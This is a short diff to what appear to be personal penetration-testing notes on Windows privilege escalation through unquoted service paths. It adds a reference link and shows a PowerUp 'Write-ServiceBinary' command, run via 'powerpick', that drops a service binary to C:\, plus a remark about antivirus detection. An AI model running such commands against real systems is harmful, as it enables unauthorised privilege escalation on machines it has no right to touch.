@@ -6,6 +6,7 @@
 
 #Techniques
 ##Unquoted service path
+#https://medium.com/@bakerc/using-powerup-to-find-and-exploit-unquoted-service-paths-in-windows-cb0056769840
 #tries to Write NCRAggregateService to c:\
 powerpick Write-ServiceBinary -Name 'NCRAggregateService' -Path C:\
 #gets flagged by AV most of the time I guess though
